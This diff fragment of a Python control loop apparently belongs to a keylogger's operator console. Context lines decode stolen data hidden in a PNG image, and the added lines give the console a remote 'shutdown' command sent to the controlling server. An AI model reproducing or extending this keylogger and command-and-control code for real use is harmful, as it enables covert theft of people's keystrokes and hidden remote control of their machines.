@@ -67,6 +67,10 @@ while True:
         data = stegano_decrypt('/tmp/tmpkeylogger.png')
         print(data)
         continue
+    if 'shutdown' in message:
+        res = requests.get(urljoin(baseurl, '/shutdown'))
+        print(res.text)
+        break
     if " " not in message:
         print("please input the format of [command] [post_body], post body is optional but space is mandatory")
         continue
